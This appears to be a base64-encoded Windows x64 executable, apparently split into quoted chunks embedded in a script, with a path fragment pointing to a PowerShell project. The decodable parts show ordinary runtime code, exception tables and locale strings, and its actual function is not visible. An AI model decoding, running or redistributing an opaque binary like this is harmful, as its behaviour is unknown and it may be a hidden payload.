AAABAAAAIgWTGQEAAAAwrQEAAAAAAAAAAAADAAAAOK0BACAAAAAAAAAAAQAAACIFkxkBAAAAMK0BAAAAAAAAAAAAAwAAAGStAQAgAAAAAAAAAAEAAAAiBZMZAgAAAJytAQAAAAAAAAAAAAUAAACsrQEAMAAAAAAAAAABAAAAIgWTGQIAAAD0rQEAAAAAAAAAAAAFAAAABK4BACAAAAAAAAAAAQAAACIFkxkBAAAARKgBAAAAAAAAAAAAAwAAADyuAQAgAAAAAAAAAAEAAAAiBZMZAgAAAGSuAQAAAAAAAAAAAAQAAAB0rgEAIAAAAAAAAAABAAAAIgWTGQEAAAC0rgEAAAAAAAAAAAADAAAAvK4BAEAAAAAAAAAAAQAAACIFkxkCAAAA5K4BAAAAAAAAAAAABAAAAPSuAQAgAAAAAAAAAAEAAAAiBZMZAgAAAACwAQAAAAAAAAAAAAQAAAAQsAEAIAAAAAAAAAABAAAAAAAAAAAAAABwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8MABgAEAAAAAAAAAAAAAAAAAAAAAAAAAUlNEU00NHvLke2tEilKUWVNdDVsBAAAAQzpcR2l0aHViXFBvd2VyU2hlbGxcSW52b','JeCBBVkiD7C','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